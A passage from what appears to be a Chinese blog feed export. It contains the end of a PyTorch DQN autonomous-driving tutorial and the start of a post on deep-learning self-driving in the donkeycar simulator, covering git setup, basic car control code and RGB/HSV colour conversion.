self.conv3 = nn.Conv2d(<span class="number">32</span>, <span class="number">32</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.bn3 = nn.BatchNorm2d(<span class="number">32</span>)</span><br><span class="line">        self.head = nn.Linear(<span class="number">896</span>,<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = F.relu(self.bn1(self.conv1(x)))  <span class="comment"># 一层卷积</span></span><br><span class="line">        x = F.relu(self.bn2(self.conv2(x)))  <span class="comment"># 两层卷积</span></span><br><span class="line">        x = F.relu(self.bn3(self.conv3(x)))  <span class="comment"># 三层卷积</span></span><br><span class="line">        <span class="keyword">return</span> self.head(x.view(x.size(<span class="number">0</span>),-<span class="number">1</span>)) <span class="comment"># 全连接层 </span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DQN</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.eval_net,self.target_net = Net(),Net()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Define counter, memory size and loss function</span></span><br><span class="line">        self.learn_step_counter = <span class="number">0</span> <span class="comment"># count the steps of learning process        </span></span><br><span class="line"> </span><br><span class="line">        self.memory = []</span><br><span class="line">        self.position = <span class="number">0</span> <span class="comment"># counter used for experience replay buff        </span></span><br><span class="line">        self.capacity = <span class="number">200</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#------- Define the optimizer------#</span></span><br><span class="line">        self.optimizer = torch.optim.Adam(self.eval_net.parameters(), lr=LR)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ------Define the loss function-----#</span></span><br><span class="line">        self.loss_func = nn.MSELoss()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span>  <span class="title function_">choose_action</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># This function is used to make decision based upon epsilon greedy</span></span><br><span class="line">        </span><br><span class="line">        x = torch.unsqueeze(torch.FloatTensor(x), <span class="number">0</span>) <span class="comment"># add 1 dimension to input state x</span></span><br><span class="line">        x = x.permute(<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)  <span class="comment">#把图片维度从[batch, height, width, channel] 转为[batch, channel, height, width]</span></span><br><span class="line">        <span class="comment"># input only one sample</span></span><br><span class="line">        <span class="keyword">if</span> np.random.uniform() &lt; EPSILON:   <span class="comment"># greedy</span></span><br><span class="line">            <span class="comment"># use epsilon-greedy approach to take action</span></span><br><span class="line">            actions_value = self.eval_net.forward(x)</span><br><span class="line">            <span class="comment">#print(torch.max(actions_value, 1)) </span></span><br><span class="line">            <span class="comment"># torch.max() returns a tensor composed of max value along the axis=dim and corresponding index</span></span><br><span class="line">            <span class="comment"># what we need is the index in this function, representing the action of cart.</span></span><br><span class="line">            action = torch.<span class="built_in">max</span>(actions_value, <span class="number">1</span>)[<span class="number">1</span>].data.numpy()</span><br><span class="line">            action = action[<span class="number">0</span>]</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            action = np.random.randint(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> action</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push_memory</span>(<span class="params">self, s, a, r, s_</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.memory) &lt; self.capacity:</span><br><span class="line">            self.memory.append(<span class="literal">None</span>)</span><br><span class="line">        self.memory[self.position] = Transition(torch.unsqueeze(torch.FloatTensor(s), <span class="number">0</span>),torch.unsqueeze(torch.FloatTensor(s_), <span class="number">0</span>),\</span><br><span class="line">                                                torch.from_numpy(np.array([a])),torch.from_numpy(np.array([r],dtype=<span class="string">&#x27;int64&#x27;</span>)))</span><br><span class="line">        self.position = (self.position + <span class="number">1</span>) % self.capacity</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_sample</span>(<span class="params">self,batch_size</span>):</span><br><span class="line">        <span class="keyword">return</span> random.sample(self.memory, batch_size)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">learn</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Define how the whole DQN works including sampling batch of experiences,</span></span><br><span class="line">        <span class="comment"># when and how to update parameters of target network, and how to implement</span></span><br><span class="line">        <span class="comment"># backward propagation.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># update the target network every fixed steps</span></span><br><span class="line">        <span class="keyword">if</span> self.learn_step_counter % TARGET_NETWORK_REPLACE_FREQ == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># Assign the parameters of eval_net to target_net</span></span><br><span class="line">            self.target_net.load_state_dict(self.eval_net.state_dict())</span><br><span class="line">        self.learn_step_counter += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        transitions = self.get_sample(BATCH_SIZE)  <span class="comment"># 抽样</span></span><br><span class="line">        batch = Transition(*<span class="built_in">zip</span>(*transitions))</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># extract vectors or matrices s,a,r,s_ from batch memory and convert these to torch Variables</span></span><br><span class="line">        <span class="comment"># that are convenient to back propagation</span></span><br><span class="line">        b_s = Variable(torch.cat(batch.state))</span><br><span class="line">        <span class="comment"># convert long int type to tensor</span></span><br><span class="line">        b_a = Variable(torch.cat(batch.action))</span><br><span class="line">        b_r = Variable(torch.cat(batch.reward))</span><br><span class="line">        b_s_ = Variable(torch.cat(batch.next_state))</span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line">        <span class="comment">#b_s和b_s_分别对应当前帧和下一帧的图像数据，变量的维度是80*60*3(x*y*rgb_channel)，但进入神经网络需将其维度变为3*80*60</span></span><br><span class="line">        b_s = b_s.permute(<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)  </span><br><span class="line">        b_s_ = b_s_.permute(<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)        </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># calculate the Q value of state-action pair</span></span><br><span class="line">        q_eval = self.eval_net(b_s).gather(<span class="number">1</span>,b_a.unsqueeze(<span class="number">1</span>)) <span class="comment"># (batch_size, 1)</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># calculate the q value of next state</span></span><br><span class="line">        q_next = self.target_net(b_s_).detach() <span class="comment"># detach from computational graph, don&#x27;t back propagate</span></span><br><span class="line">        <span class="comment"># select the maximum q value</span></span><br><span class="line">        <span class="comment"># q_next.max(1) returns the max value along the axis=1 and its corresponding index</span></span><br><span class="line">        q_target = b_r + GAMMA * q_next.<span class="built_in">max</span>(<span class="number">1</span>)[<span class="number">0</span>].view(BATCH_SIZE, <span class="number">1</span>) <span class="comment"># (batch_size, 1)</span></span><br><span class="line">        loss = self.loss_func(q_eval, q_target)</span><br><span class="line">        </span><br><span class="line">        self.optimizer.zero_grad() <span class="comment"># reset the gradient to zero</span></span><br><span class="line">        loss.backward()</span><br><span class="line">        self.optimizer.step() <span class="comment"># execute back propagation for one step</span></span><br><span class="line">        </span><br><span class="line">Transition = namedtuple(<span class="string">&#x27;Transition&#x27;</span>,(<span class="string">&#x27;state&#x27;</span>, <span class="string">&#x27;next_state&#x27;</span>,<span class="string">&#x27;action&#x27;</span>, <span class="string">&#x27;reward&#x27;</span>))</span><br></pre></td></tr></table></figure><p>之后添加主函数，模型便可以开始训练。每次和环境交互时选择action，一定概率是模型的输出结果，一定概率是随机选择，可以通过阈值设定(EPSILON)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    env=Car_Env()</span><br><span class="line">    s=env.reset()</span><br><span class="line">    dqn=DQN()</span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        a=dqn.choose_action(s)</span><br><span class="line">        s_,r,done,info = env.step(a)</span><br><span class="line">        dqn.push_memory(s, a, r, s_)    </span><br><span class="line">        s=s_    </span><br><span class="line">        <span class="keyword">if</span> (dqn.position % (MEMORY_CAPACITY-<span class="number">1</span>) )== <span class="number">0</span>:</span><br><span class="line">            dqn.learn()</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;learned times:&#x27;</span>,count)</span><br></pre></td></tr></table></figure><p>运行主函数后，我们就可以看到小车在道路中反复做出各种action以便探索环境。</p><p> 但是现在的模型还很基础，神经网络对驾驶的控制也远没达到智能，需要经过成千上万次的训练，或者增加传感器或摄像头数据的丰富度，才有可能训练出达到驾驶要求的DQN网络。愿意做下去的同学上github找好的模型或好的paper复现。千万不要硬跑这个模型，我们的电脑跑起来是没有止境的。</p><p>那么这个小教程就到这里了。还有很多不是很完善的地方，以后我会慢慢完善或出视频。感谢看到这里，希望对大家有所帮助。</p><p>参考文献：</p><p><a href="https://blog.csdn.net/weixin_44169614/article/details/118681651">使用CARLA模拟器实现DQN自动驾驶</a></p><p><a href="https://blog.csdn.net/weixin_44169614/article/details/121444571">DQN自动驾驶——python+gym实现</a></p><p><a href="https://zhuanlan.zhihu.com/p/108286901">【强化学习】Deep Q-Network (DQN) - 知乎 (zhihu.com)</a></p><p><a href="http://carla.org/">carla.org</a></p><p><a href="https://www.carla.org.cn/#/">Carla 中文站</a></p><p><a href="https://zhuanlan.zhihu.com/p/365732535">CARLA完全实践-核心概念 - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于深度学习的端到端自动驾驶</title>
      <link href="/2024/02/04/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%AB%AF%E5%88%B0%E7%AB%AF%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/"/>
      <url>/2024/02/04/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%AB%AF%E5%88%B0%E7%AB%AF%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="基于深度学习的端到端自动驾驶"><a href="#基于深度学习的端到端自动驾驶" class="headerlink" title="基于深度学习的端到端自动驾驶"></a>基于深度学习的端到端自动驾驶</h1><p>主体来源:<a href="https://blog.csdn.net/qianbin3200896/article/details/119832583">钱斌的博客</a> </p><h2 id="1-模拟平台安装和基本使用"><a href="#1-模拟平台安装和基本使用" class="headerlink" title="1.模拟平台安装和基本使用"></a>1.模拟平台安装和基本使用</h2><h3 id="1-1模拟器的安装"><a href="#1-1模拟器的安装" class="headerlink" title="1.1模拟器的安装"></a>1.1模拟器的安装</h3><p>下载地址：<a href="https://github.com/tawnkramer/gym-donkeycar/releases">右键或点击此处</a>或按住ctrl+&#x2F;进入代码模式，复制链接到浏览器打开。</p><p>该地址中提供的模拟器是基于Unity开发的，是经过删减过后的可执行程序，不再需要额外安装unity，下载下来后就可以直接运行。目前覆盖windows、Linux、Mac共3个版本。以下只讲解如何在windows平台上运行和使用该模拟器。</p><p>下载完成后运行donkey_sim.exe文件即可进入模拟器。左边是设置，根据自己的需要进行设置即可。</p><p>在场景中，如果我们前面主界面使用了手工模式（paceCar处勾选manualDriving），那么我们就可以通过键盘来操控小车进行体验了。与一般的赛车游戏类似，W键表示前进，A表示左转，D表示右转，S表示后退。</p><p>在该模拟器中，控制小车的主要是两个参数：油门（W和S键）和转向角度（A和D键），这个与我们真实驾驶的汽车基本一致：挂挡+踩油门来控制前进动力，打方向盘控制车辆转向。为了能够实现自动驾驶，我们首先要能够根据这两个参数去控制模拟器里面小车的运行。我们怎么样通过Python代码来控制这个模拟器呢？</p><h3 id="1-2git工具的安装与配置"><a href="#1-2git工具的安装与配置" class="headerlink" title="1.2git工具的安装与配置"></a>1.2git工具的安装与配置</h3><p>详细的git工具安装与教程请参照<a href="https://blog.csdn.net/mukes/article/details/115693833">这篇文章</a>，这里仅描述如何在pycharm中使用git</p><h4 id="1-2-1注册github账号"><a href="#1-2-1注册github账号" class="headerlink" title="1.2.1注册github账号"></a>1.2.1注册github账号</h4><p> <a href="https://github.com/">GitHub官网</a> 按照提示进行注册。请注意记下用户名和邮箱地址，下面步骤需要使用。</p><h4 id="1-2-2安装git"><a href="#1-2-2安装git" class="headerlink" title="1.2.2安装git"></a>1.2.2安装git</h4><p> <a href="https://git-scm.com/">到git官网下载git安装包</a>，点击downloads，选择操作平台(windows)，下载完成后运行，第一次选择全勾，后面一直下一步即可。</p><p>下载完成后，运行cmd，输入命令检查下载版本。能正确显示版本即为安装成功</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git version</span><br></pre></td></tr></table></figure><h4 id="1-2-3配置git"><a href="#1-2-3配置git" class="headerlink" title="1.2.3配置git"></a>1.2.3配置git</h4><p>安装成功后，配置git</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;用户名&quot;</span><br><span class="line"></span><br><span class="line">git config --global user.email  &quot;用户邮箱&quot;</span><br></pre></td></tr></table></figure><p><strong>请注意此处空格必须严格遵循，否则将无法配置成功。建议直接复制过去改。</strong></p><p>检查配置是否成功。在最下面会出现属性user.name与user.email，如果没有请重新到回到上一步。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure><h4 id="1-2-4在pycharm中配置git"><a href="#1-2-4在pycharm中配置git" class="headerlink" title="1.2.4在pycharm中配置git"></a>1.2.4在pycharm中配置git</h4><p>file-&gt;settings-&gt;version control-&gt;git，一般此处默认检测系统中安装的第一个git，如果没有检测到请手动选择。</p><p> <a href="https://blog.csdn.net/zeroooorez/article/details/94715752">具体git操作请参照这篇文章</a> 这里不进行描述。</p><p>###1.3自动驾驶初体验</p><p>这个模拟器的好处就在于预留了Python控制接口，我们只需要安装一个驱动库就可以直接驱动模拟器里面的小车运行（提前安装好Git工具）：</p><p>在pycharm下方终端输入以下pip命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install git+https://github.com/tawnkramer/gym-donkeycar</span><br></pre></td></tr></table></figure><p> 安装好以后我们可以运行下面的python代码来实现小车的控制（注意：运行下面的代码前先启动模拟器，并停留在模拟器对应地图里） ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入库</span></span><br><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> gym_donkeycar</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 设置模拟器环境</span></span><br><span class="line">env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 重置当前场景</span></span><br><span class="line">obv = env.reset()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 运行100帧</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="comment"># 定义控制动作</span></span><br><span class="line">    action = np.array([<span class="number">0.3</span>,<span class="number">0.5</span>]) <span class="comment"># 动作控制，0.3表示转向，0.5表示油门</span></span><br><span class="line">    <span class="comment"># 执行动作</span></span><br><span class="line">    obv, reward, done, info = env.step(action)</span><br><span class="line">    <span class="comment"># 取一张图像保存</span></span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">20</span>:</span><br><span class="line">        img = cv2.cvtColor(obv,cv2.COLOR_RGB2BGR)</span><br><span class="line">        cv2.imwrite(<span class="string">&#x27;test.jpg&#x27;</span>,img)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 运行完以后重置当前场景</span></span><br><span class="line">obv = env.reset()</span><br></pre></td></tr></table></figure><p> 我们先分析下这段代码。下面这行代码用于设置模拟器环境，简单来说就是启用哪张地图： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个模拟器里面我们可以用到的地图如下所示：</p><ul><li><p>“donkey-warehouse-v0”</p></li><li><p>“donkey-generated-roads-v0”</p></li><li><p>“donkey-avc-sparkfun-v0”</p></li><li><p>“donkey-generated-track-v0”</p></li><li><p>“donkey-roboracingleague-track-v0”</p></li><li><p>“donkey-waveshare-v0”</p></li><li><p>“donkey-minimonaco-track-v0”</p></li><li><p>“donkey-warren-track-v0”</p></li><li><p>“donkey-thunderhill-track-v0”</p></li><li><p>“donkey-circuit-launch-track-v0”<br>  接下来的代码里面，我们运行了100帧，每帧都用固定的控制参数来执行：右转0.3、前进0.5。这两个字段就是我们前面提到的转向和油门值。下面给出这两个值的具体定义：</p></li></ul><p>油门值取值范围是[-1，1]，负值代表倒退，正值代表前进。转向值取值范围也是[-1，1]，负值代表向左，正值代表向右。</p><p>接下来使用np.array封装这两个参数，然后通过env.step来执行单步动作。执行完动作以后会返回一些信息，其中我们需要重点关注obs这个返回参数，这个参数表示当前位于小车正中间行车记录仪摄像头返回的一帧图像 ，图像宽160像素，高120像素，3通道RGB图像。可以在代码根目录下找到test.jpg文件查看。</p><p><a href="https://www.bilibili.com/video/BV1Wy4y1h7ii?share_source=copy_web">numpy教程十分钟入门</a></p><p><a href="https://www.bilibili.com/video/BV1Fo4y1d7JL?share_source=copy_web">openCV教程 黑马程序员</a></p><p>建议观看以上视频，学习一定的基础知识。当然没有这样的知识硬记语法也是可以的。</p><h2 id="2-基于OpenCV的自动驾驶控制"><a href="#2-基于OpenCV的自动驾驶控制" class="headerlink" title="2.基于OpenCV的自动驾驶控制"></a>2.基于OpenCV的自动驾驶控制</h2><p>在学习自动驾驶前，我们先看看传统算法是怎么解决自动驾驶任务的。本节为后续自动驾驶作铺垫，如果不感兴趣可以直接跳转到深度学习部分。</p><p>我们希望通过算法来控制小车，最终让这个小车稳定运行在行车道内。这里面涉及到两方面：感知和动作规划。感知部分我们主要通过行道线检测来实现，动作规划通过操控转向角度来实现。行道线检测的目的就是希望能够根据检测到的行道线位置来计算最终应该转向的角度，从而控制小车始终运行在当前车道线内。</p><p>由于道路环境比较简单，针对我们这个任务，我们进一步简化我们的控制变量，我们只控制转向角度，对于油门值我们在运行时保持低匀速，这样我们的重点就可以放在一个变量上面—转向角度。</p><h3 id="2-1基于HSV空间的特定颜色区域提取"><a href="#2-1基于HSV空间的特定颜色区域提取" class="headerlink" title="2.1基于HSV空间的特定颜色区域提取"></a>2.1基于HSV空间的特定颜色区域提取</h3><p> 颜色过滤是目前经常被使用到的图像处理技巧之一，例如天气预报抠像等，经常会使用绿幕作为背景进行抠图。本小节使用颜色过滤来初步提取出行道线。 </p><p>从模拟平台的图像数据上进行分析，小车左侧是黄实线，右侧是白实线。我们希望小车一直运行在这两根线之间。因此，我们首先要定位出这两根线。我们可以通过颜色空间变换来定位这两根线。</p><p>为了方便将黄色线和白色线从图像中过滤出来，我们需要将图像从RGB空间转换到HSV空间再处理。</p><p>这里首先我们解释下RGB和HSV颜色空间的区别。</p><p>RGB 是我们接触最多的颜色空间，由三个通道表示一幅图像，分别为红色(R)，绿色(G)和蓝色(B)。这三种颜色的不同组合可以形成几乎所有的其他颜色。RGB 颜色空间是图像处理中最基本、最常用、面向硬件的颜色空间，比较容易理解。RGB 颜色空间利用三个颜色分量的线性组合来表示颜色，任何颜色都与这三个分量有关，而且这三个分量是高度相关的，所以连续变换颜色时并不直观，想对图像的颜色进行调整需要更改这三个分量才行。自然环境下获取的图像容易受自然光照、遮挡和阴影等情况的影响，即对亮度比较敏感。而 RGB 颜色空间的三个分量都与亮度密切相关，即只要亮度改变，三个分量都会随之相应地改变，而没有一种更直观的方式来表达。但是人眼对于这三种颜色分量的敏感程度是不一样的，在单色中，人眼对红色最不敏感，蓝色最敏感，所以 RGB 颜色空间是一种均匀性较差的颜色空间。如果颜色的相似性直接用欧氏距离来度量，其结果与人眼视觉会有较大的偏差。对于某一种颜色，我们很难推测出较为精确的三个分量数值来表示。所以，RGB 颜色空间适合于显示系统，却并不适合于图像处理。</p><p>基于上述理由，在图像处理中使用较多的是 HSV 颜色空间，它比 RGB 更接近人们对彩色的感知经验。非常直观地表达颜色的色调、鲜艳程度和明暗程度，方便进行颜色的对比。在 HSV 颜色空间下，比 BGR 更容易跟踪某种颜色的物体，常用于分割指定颜色的物体。HSV 表达彩色图像的方式由三个部分组成：</p><ul><li><p>Hue（色调、色相）</p></li><li><p>Saturation（饱和度、色彩纯净度）</p></li><li><p>Value（明度）</p></li></ul><p>其中Hue用角度度量，取值范围为0～360°，表示色彩信息，即所处的光谱颜色的位置，如下图所示。</p><p> <img src="/.io//b544148acdca474388fc0347f155d4f1.png" alt="img"> </p><p>如果我们想要过滤出黄色线，那么我们就可以将色调范围控制在[30~ 90]之间即可。注意：在OpenCV中色调范围是[0~ 180]，因此上述黄色范围需要缩小1倍，即[15~ 45]。检测白色行道线也是采用类似的原理。 </p><p>RGB转化到HSV的算法(c++):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">float</span> <span class="title">retmax</span><span class="params">(<span class="type">float</span> a,<span class="type">float</span> b,<span class="type">float</span> c)</span><span class="comment">//求最大值</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">float</span> max = <span class="number">0</span>;</span><br><span class="line">    max = a;</span><br><span class="line">    <span class="keyword">if</span>(max&lt;b)</span><br><span class="line">        max = b;</span><br><span class="line">    <span class="keyword">if</span>(max&lt;c)</span><br><span class="line">        max = c;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">retmin</span><span class="params">(<span class="type">float</span> a,<span class="type">float</span> b,<span class="type">float</span> c)</span><span class="comment">//求最小值</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">float</span> min = <span class="number">0</span>;</span><br><span class="line">    min = a;</span><br><span class="line">    <span class="keyword">if</span>(min&gt;b)</span><br><span class="line">        min = b;</span><br><span class="line">    <span class="keyword">if</span>(min&gt;c)</span><br><span class="line">        min = c;</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//R,G,B参数传入范围（0~100）</span></span><br><span class="line"><span class="comment">//转换结果h(0~360),s(0~100),v(0~100)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rgb_to_hsv</span><span class="params">(<span class="type">float</span> *h,<span class="type">float</span> *s,<span class="type">float</span> *v,<span class="type">float</span> R,<span class="type">float</span> G,<span class="type">float</span> B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">float</span> max = <span class="number">0</span>,min = <span class="number">0</span>;</span><br><span class="line">    R = R/<span class="number">100</span>;</span><br><span class="line">    G = G/<span class="number">100</span>;</span><br><span class="line">    B = B/<span class="number">100</span>;</span><br><span class="line"> </span><br><span class="line">    max = <span class="built_in">retmax</span>(R,G,B);</span><br><span class="line">    min = <span class="built_in">retmin</span>(R,G,B);</span><br><span class="line">    *v = max;</span><br><span class="line">    <span class="keyword">if</span>(max == <span class="number">0</span>)</span><br><span class="line">        *s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *s = <span class="number">1</span> - (min/max);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(max == min)</span><br><span class="line">        *h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max == R &amp;&amp; G&gt;=B)</span><br><span class="line">        *h = <span class="number">60</span>*((G-B)/(max-min));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max == R &amp;&amp; G&lt;B)</span><br><span class="line">        *h = <span class="number">60</span>*((G-B)/(max-min)) + <span class="number">360</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max == G)</span><br><span class="line">        *h = <span class="number">60</span>*((B-R)/(max-min)) + <span class="number">120</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max == B)</span><br><span class="line">        *h = <span class="number">60</span>*((R-G)/(max-min)) + <span class="number">240</span>;</span><br><span class="line"> </span><br><span class="line">    *v = *v * <span class="number">100</span>;</span><br><span class="line">    *s = *s * <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HSV转RGB算法：(c++)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参数入参范围h(0~360),s(0~100),v(0~100),这里要注意，要把s,v缩放到0~1之间</span></span><br><span class="line"><span class="comment">//转换结果R(0~100),G(0~100),B(0~100)，如需转换到0~255，只需把后面的乘100改成乘255</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hsv_to_rgb</span><span class="params">(<span class="type">int</span> h,<span class="type">int</span> s,<span class="type">int</span> v,<span class="type">float</span> *R,<span class="type">float</span> *G,<span class="type">float</span> *B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">float</span> C = <span class="number">0</span>,X = <span class="number">0</span>,Y = <span class="number">0</span>,Z = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> H=(<span class="type">float</span>)(h);</span><br><span class="line">    <span class="type">float</span> S=(<span class="type">float</span>)(s)/<span class="number">100.0</span>;</span><br><span class="line">    <span class="type">float</span> V=(<span class="type">float</span>)(v)/<span class="number">100.0</span>;</span><br><span class="line">    <span class="keyword">if</span>(S == <span class="number">0</span>)</span><br><span class="line">        *R = *G = *B = V;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        H = H/<span class="number">60</span>;</span><br><span class="line">        i = (<span class="type">int</span>)H;</span><br><span class="line">        C = H - i;</span><br><span class="line"> </span><br><span class="line">        X = V * (<span class="number">1</span> - S);</span><br><span class="line">        Y = V * (<span class="number">1</span> - S*C);</span><br><span class="line">        Z = V * (<span 